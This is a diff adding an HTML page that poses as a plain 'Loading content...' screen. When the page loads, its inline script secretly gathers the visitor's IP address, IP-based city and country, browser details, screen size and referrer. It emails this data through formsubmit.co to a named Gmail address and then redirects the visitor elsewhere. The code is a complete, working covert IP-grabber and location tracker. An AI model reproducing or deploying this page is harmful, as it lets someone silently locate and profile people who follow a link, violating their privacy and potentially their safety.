@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            background: #f5f7fa;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            color: #333;
+        }
+        .loading-text {
+            font-size: 18px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <div class="loader"></div>
+        <p class="loading-text">Loading content...</p>
+    </div>
+
+    <script>
+        // Instant tracking without waiting for window.onload
+        (async function() {
+            try {
+                // Get IP and device info
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const { ip } = await ipRes.json();
+               
+                // Get approximate location from IP
+                const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locationData = await locRes.json();
+               
+                // Prepare tracking data
+                const trackingData = {
+                    IP: ip,
+                    Time: new Date().toISOString(),
+                    Device: navigator.userAgent,
+                    Screen: `${window.screen.width}x${window.screen.height}`,
+                    URL: window.location.href,
+                    Referrer: document.referrer || "Direct",
+                    Approx_Location: locationData.city ?
+                        `${locationData.city}, ${locationData.region}, ${locationData.country_name}` :
+                        "Unknown"
+                };
+
+                // Send data immediately
+                await fetch('https://formsubmit.co/ajax/ahmadelshabrawy320@gmail.com', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        _subject: `📌 Instant Visit from ${ip}`,
+                        _template: "table",
+                        ...trackingData
+                    })
+                });
+
+                // Optional: Redirect after sending
+                setTimeout(() => {
+                    window.location.href = "https://example.com"; // Your real destination
+                }, 1500);
+
+            } catch (error) {
+                console.error("Tracking failed:", error);
+                window.location.href = "https://example.com"; // Fallback redirect
+            }
+        })();
+    </script>
+</body>
+</html>
